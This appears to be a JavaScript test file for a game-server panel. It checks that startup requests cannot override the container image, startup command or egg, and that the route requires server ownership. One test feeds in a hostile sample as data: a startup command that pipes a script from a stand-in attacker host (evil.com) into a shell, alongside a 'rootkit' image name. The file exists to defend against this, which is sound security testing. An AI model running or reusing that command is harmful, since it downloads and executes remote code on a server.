"use strict";

const assert = require("assert");
const fs = require("fs");
const path = require("path");
const { validate, schemas } = require("../handlers/validate");

async function runTests() {
  console.log("=== Testing Server Startup Security & Validation ===");

  // Test 1: serverStartup schema validates legitimate environment update
  {
    console.log("Test 1: serverStartup schema validates legitimate environment update");
    const validBody = {
      environment: { SERVER_JARFILE: "server.jar" },
      skip_scripts: false
    };
    const parsed = schemas.serverStartup.safeParse(validBody);
    assert.strictEqual(parsed.success, true);
    assert.deepStrictEqual(parsed.data, validBody);
    console.log("  Passed");
  }

  // Test 2: serverStartup schema shape excludes arbitrary image, egg, and startup
  {
    console.log("Test 2: serverStartup schema shape excludes arbitrary image, egg, and startup");
    assert.strictEqual(schemas.serverStartup.shape.image, undefined, "image field must not exist in schema");
    assert.strictEqual(schemas.serverStartup.shape.startup, undefined, "startup field must not exist in schema");
    assert.strictEqual(schemas.serverStartup.shape.egg, undefined, "egg field must not exist in schema");
    console.log("  Passed: image, startup, egg removed from schema shape");
  }

  // Test 3: validate middleware strips arbitrary image/startup/egg from req.body
  {
    console.log("Test 3: validate middleware strips arbitrary image/startup/egg from req.body");
    const req = {
      body: {
        image: "attacker/rootkit:latest",
        startup: "curl https://evil.com/payload | sh",
        egg: 999,
        environment: { TEST: "123" },
        skip_scripts: true
      }
    };
    const res = {
      status(code) { this.statusCode = code; return this; },
      json(data) { this.body = data; return this; }
    };
    let nextCalled = false;
    const middleware = validate(schemas.serverStartup);
    middleware(req, res, () => { nextCalled = true; });

    assert.strictEqual(nextCalled, true);
    assert.strictEqual(req.body.image, undefined, "req.body.image must be stripped");
    assert.strictEqual(req.body.startup, undefined, "req.body.startup must be stripped");
    assert.strictEqual(req.body.egg, undefined, "req.body.egg must be stripped");
    assert.strictEqual(req.body.skip_scripts, true);
    assert.deepStrictEqual(req.body.environment, { TEST: "123" });
    console.log("  Passed: arbitrary parameters sanitized and removed");
  }

  // Test 4: Verify startup route uses isServerOwner middleware instead of ownsServer
  {
    console.log("Test 4: Verify startup.js uses isServerOwner middleware");
    const startupCode = fs.readFileSync(path.join(__dirname, "../modules/server/startup.js"), "utf8");
    assert.ok(startupCode.includes("isServerOwner"), "startup.js must import and use isServerOwner");
    assert.ok(!startupCode.includes("ownsServer"), "startup.js must not use ownsServer");
    assert.ok(!startupCode.includes("startup || currentServerDetails"), "startup.js must not accept startup override");
    assert.ok(!startupCode.includes("image || currentServerDetails"), "startup.js must not accept image override");
    assert.ok(!startupCode.includes("egg || currentServerDetails"), "startup.js must not accept egg override");
    console.log("  Passed: route verified to require isServerOwner and strictly bind to egg container defaults");
  }

  console.log("=== All Server Startup security tests passed! ===");
}

runTests().catch(err => {
  console.error("Test failure:", err);
  process.exit(1);
});
